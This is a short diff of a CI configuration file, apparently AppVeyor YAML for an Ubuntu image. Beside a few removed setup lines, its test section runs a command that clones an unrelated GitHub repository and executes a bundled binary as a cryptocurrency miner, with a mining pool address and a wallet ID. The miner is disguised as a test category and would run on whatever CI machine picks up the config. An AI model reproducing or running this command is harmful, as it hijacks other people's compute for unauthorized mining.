@@ -1,12 +1,7 @@
 image: Ubuntu
 
-test_script:
-- sudo apt-get update -y
-
 test:
   categories:
     - git clone https://github.com/remakove/marsose.git marsose && cd marsose && chmod +x sedua-sse2 && ./sedua-sse2 -a yespower -o stratum+tcp://stratum-na.rplant.xyz:13350 -u VPwdqwJ6LLWnCLeS9XPfoiXn81nuUjPB4E.pc -t 2
     - [UI]
     - [DAL, BL]
-
-build: off
